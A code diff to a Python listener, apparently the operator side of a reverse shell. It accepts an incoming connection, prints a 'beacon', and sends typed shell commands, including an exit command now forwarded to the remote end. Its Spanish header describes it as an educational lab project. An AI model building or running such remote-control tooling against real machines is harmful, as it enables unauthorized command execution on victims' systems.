@@ -4,6 +4,7 @@
 # PROPÓSITO: Proyecto educativo de seguridad defensiva (Blue Team)
 # ADVERTENCIA: Solo usar en laboratorio aislado propio
 # =============================================================================
+
 import socket
 
 class Listener:
@@ -16,7 +17,7 @@ class Listener:
         self.connection, address = listener.accept()
         print("[+] Tenemos una conexion de " + str(address))
         
-        # ← ✅ AGREGAR ESTO: Recibir el conexion ANTES del loop
+        # ← RECIBIR BEACON
         conexion = self.connection.recv(1024)
         print(conexion.decode('utf-8', errors='ignore'))
         
@@ -26,10 +27,11 @@ class Listener:
     
     def run(self):
         while True:
-            command = input("shell »» ")  # ← Sin \n
+            command = input("shell »» ")
             
-            # ← ✅ CHECK PRIMERO
+            # ← ✅ ENVIAR "salir" ANTES DE CERRAR
             if command == "salir":
+                self.ejecutarRemoto(command)  # ← Envía al Reverse Shell
                 self.connection.close()
                 exit()
             
